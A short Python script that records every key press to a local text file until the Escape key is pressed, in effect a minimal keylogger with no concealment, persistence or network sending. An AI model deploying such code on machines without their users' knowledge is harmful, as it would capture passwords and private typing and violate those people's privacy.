import keyboard

def log_keystrokes(event):
    with open("keystrokes_log.txt", "a") as file:
        file.write(event.name)

keyboard.on_press(log_keystrokes)

# Block until the user presses the escape key
keyboard.wait("esc")
